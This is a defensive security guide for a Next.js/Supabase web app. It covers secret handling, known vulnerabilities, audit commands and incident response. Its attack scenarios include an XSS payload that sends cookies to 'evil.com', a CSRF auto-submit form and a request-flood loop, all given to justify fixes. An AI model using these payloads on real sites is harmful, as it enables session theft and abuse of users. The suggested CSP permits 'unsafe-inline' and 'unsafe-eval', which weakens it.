# 🔒 SECURITY GUIDE - SolvingHub
**Date**: 2026-01-19  
**Milestone**: 3 - Secure the System

---

## ⚠️ CRITICAL SECURITY CHECKLIST

### ✅ Task 3.1: Secure Service Role Key

**Status**: `.env*` already in `.gitignore` ✅

**Verification Steps**:

1. **Check if .env.local is tracked in Git**:
```bash
git ls-files | grep .env
# Expected: No output (file not tracked)

# If it returns .env.local, it's being tracked - URGENT FIX NEEDED:
git rm --cached .env.local
git commit -m "Remove .env.local from Git tracking"
```

2. **Check Git history for exposed keys**:
```bash
git log --all --full-history -- .env.local
# If this shows commits, the key was exposed in history!
```

3. **If key was exposed in history, ROTATE IMMEDIATELY**:
   - Go to Supabase Dashboard
   - Settings → API → Service Role Key
   - Click "Generate new key"
   - Copy new key
   - Update local `.env.local`
   - **NEVER commit this file**

4. **Add .env.local.example for team**:
```bash
# Create template (no secrets)
cat > .env.local.example << EOF
NEXT_PUBLIC_SUPABASE_URL=your-project-url-here
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key-here
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key-here

# Database URL (optional, for migrations)
DATABASE_URL=your-database-url-here
EOF

git add .env.local.example
git commit -m "Add environment template"
```

**Why This Matters**:
- Service role key bypasses ALL Row Level Security policies
- If leaked, attacker has full database access (read, write, delete)
- Can steal all user data, delete all problems, inject malicious content

---

## 🛡️ IMPLEMENTED SECURITY MEASURES

### Layer 1: Input Validation (Milestone 2)
✅ Zod schemas validate all API inputs  
✅ Database constraints enforce limits  
✅ Type checking prevents injection attacks  

### Layer 2: Authentication & Authorization
✅ Supabase Auth with Google OAuth  
✅ Server-side auth checks in all API routes  
✅ Ownership verification before updates/deletes  
✅ Row Level Security policies in database  

### Layer 3: Error Handling
✅ Centralized error handler prevents info leaks  
✅ Production mode hides stack traces  
✅ Detailed errors only in development  

---

## 🚨 REMAINING VULNERABILITIES (TO FIX)

### 1. No Rate Limiting ⚠️ HIGH RISK
**Vulnerability**: Anyone can spam API requests  
**Attack Scenario**:
```javascript
// Attacker script - creates 10,000 problems in seconds
for (let i = 0; i < 10000; i++) {
  fetch('/api/problems', {
    method: 'POST',
    body: JSON.stringify({ /* valid data */ })
  })
}
```
**Impact**: 
- Database overload
- Increased hosting costs
- Service denial for legitimate users

**Fix**: Implement rate limiting (Task 3.2)

---

### 2. No Input Sanitization ⚠️ HIGH RISK
**Vulnerability**: XSS (Cross-Site Scripting) attacks  
**Attack Scenario**:
```javascript
// Attacker posts problem with malicious title
{
  "title": "<img src=x onerror='alert(document.cookie)'>",
  "description": "<script>fetch('evil.com?cookie='+document.cookie)</script>..."
}
```
**Impact**:
- Steal user session cookies
- Redirect users to phishing sites
- Inject malicious scripts

**Fix**: Sanitize inputs with DOMPurify (Task 3.3)

---

### 3. No CSRF Protection ⚠️ MEDIUM RISK
**Vulnerability**: Cross-Site Request Forgery  
**Attack Scenario**:
```html
<!-- Attacker's website -->
<form action="https://solvinghub.com/api/problems" method="POST">
  <input name="title" value="Spam Problem">
  <!-- Form auto-submits when user visits page -->
</form>
<script>document.forms[0].submit()</script>
```
**Impact**:
- Unauthorized actions on user's behalf
- Spam problem creation
- Vote manipulation

**Fix**: CSRF tokens or SameSite cookies (Task 3.4)

---

### 4. No Content Security Policy 🟡 MEDIUM RISK
**Vulnerability**: XSS and clickjacking  
**Fix**: Add CSP headers in `next.config.mjs`:
```javascript
const nextConfig = {
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
        },
        {
          key: 'X-Frame-Options',
          value: 'DENY'
        },
        {
          key: 'X-Content-Type-Options',
          value: 'nosniff'
        }
      ]
    }]
  }
}
```

---

### 5. No HTTPS Enforcement 🟡 LOW RISK (if on Vercel)
Vercel auto-enforces HTTPS, but add redirect in production:
```javascript
// middleware.js
if (process.env.NODE_ENV === 'production' && !request.headers.get('x-forwarded-proto')?.includes('https')) {
  return NextResponse.redirect(`https://${request.headers.get('host')}${request.nextUrl.pathname}`)
}
```

---

## 📋 SECURITY BEST PRACTICES

### API Routes
- ✅ Always verify authentication
- ✅ Check ownership before updates/deletes
- ✅ Validate ALL inputs with Zod
- ✅ Use parameterized queries (Supabase handles this)
- ✅ Log security events (auth failures, suspicious activity)

### Database
- ✅ Enable Row Level Security on all tables
- ✅ Use foreign key constraints
- ✅ Add CHECK constraints for validation
- ⚠️ Never use service role key in client-side code
- ⚠️ Review RLS policies regularly

### Secrets Management
- ✅ Use environment variables
- ✅ Never commit .env files
- ✅ Rotate keys regularly (every 90 days)
- ✅ Use different keys for dev/staging/prod
- ⚠️ Enable secret scanning in GitHub

### User Data
- ✅ Hash passwords (Supabase handles this)
- ✅ Validate email addresses
- ⚠️ Implement data retention policy
- ⚠️ Add GDPR compliance features (data export/delete)

---

## 🔍 SECURITY AUDIT COMMANDS

### Check for sensitive data in Git
```bash
# Search for API keys in history
git log -S "supabase" --all --oneline

# Search for passwords
git log -S "password" --all --oneline

# Check current files
grep -r "SUPABASE_SERVICE_ROLE_KEY" .
```

### Check dependencies for vulnerabilities
```bash
npm audit
npm audit fix

# For critical vulnerabilities
npm audit fix --force
```

### Check for exposed ports
```bash
netstat -an | grep LISTEN
# Should only see 3000 (dev server)
```

---

## 🚀 DEPLOYMENT SECURITY

### Environment Variables (Vercel)
1. Go to Vercel Dashboard → Project → Settings → Environment Variables
2. Add variables:
   - `NEXT_PUBLIC_SUPABASE_URL` (Production)
   - `NEXT_PUBLIC_SUPABASE_ANON_KEY` (Production)
   - `SUPABASE_SERVICE_ROLE_KEY` (Secret - Production)
3. **NEVER** set service role key as `NEXT_PUBLIC_*`

### Build Verification
```bash
# Before deploying, verify no secrets in build
npm run build
grep -r "SUPABASE_SERVICE_ROLE_KEY" .next/
# Should return no results
```

---

## 📞 INCIDENT RESPONSE

### If Service Role Key is Leaked

1. **IMMEDIATE**: Rotate key in Supabase dashboard
2. **Check database logs** for suspicious activity
3. **Review all data** for unauthorized changes
4. **Notify users** if data was accessed
5. **Update key** in all environments
6. **Remove from Git history** if committed

### If User Data is Compromised

1. **Identify scope**: Which users affected?
2. **Contain breach**: Revoke compromised sessions
3. **Notify affected users** within 72 hours (GDPR)
4. **Document incident**: What, when, how, impact
5. **Fix vulnerability**: Patch, test, deploy
6. **Post-mortem**: Prevent future incidents

---

## ✅ SECURITY COMPLETION CHECKLIST

- [x] .env files in .gitignore
- [x] Input validation with Zod
- [x] Database constraints
- [x] Error handling doesn't leak secrets
- [ ] Rate limiting implemented (Task 3.2)
- [ ] Input sanitization with DOMPurify (Task 3.3)
- [ ] CSRF protection (Task 3.4 - Optional)
- [ ] CSP headers configured (Task 3.4 - Optional)
- [ ] Security headers added (Task 3.4 - Optional)
- [ ] npm audit vulnerabilities fixed
- [ ] Git history checked for secrets
- [ ] Service role key rotated (if ever exposed)

---

**Next Steps**: Implement remaining tasks (3.2, 3.3, 3.4)
